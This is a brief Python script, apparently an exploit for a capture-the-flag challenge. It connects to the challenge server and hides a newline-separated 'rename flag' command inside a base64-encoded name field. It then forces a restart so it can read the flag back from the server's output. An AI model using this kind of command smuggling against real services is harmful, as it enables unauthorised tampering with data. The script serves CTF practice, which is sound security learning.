import os
import re
import sys
import base64

import nclib


def main():
    HOST = os.environ.get("HOST", "localhost")
    PORT = int(os.environ.get("PORT", 1337))

    nc = nclib.Netcat(HOST, PORT)

    first_line = nc.recv(7)
    if first_line == b"Ticket ":
        # This is a ticket server, so we need to send the ticket
        ticket = os.environ["TICKET"]
        nc.sendline(ticket)

    nc.recvuntil(b"Please enter your name: ")
    nc.sendline(b"base64:" + base64.b64encode(b"\nrename flag pet_pow_4e09:abcd\n"))
    nc.recvuntil(b"your nonce:")

    # put in a wrong nonce so it restarts
    nc.sendline(b"aaaaaaaaaa")

    nc.recvuntil(b"Please enter your name: ")
    nc.sendline(b"abcd")
    nc.recvuntil(b"\n")
    data = nc.recvuntil(b"your nonce:").decode("utf-8")
    print(data)
    m = re.search(r"Prefix: ([^\n]*)", data)
    if m is None:
        print("Flag is not found in the output\n")
    else:
        print(m.group(1))


if __name__ == "__main__":
    main()
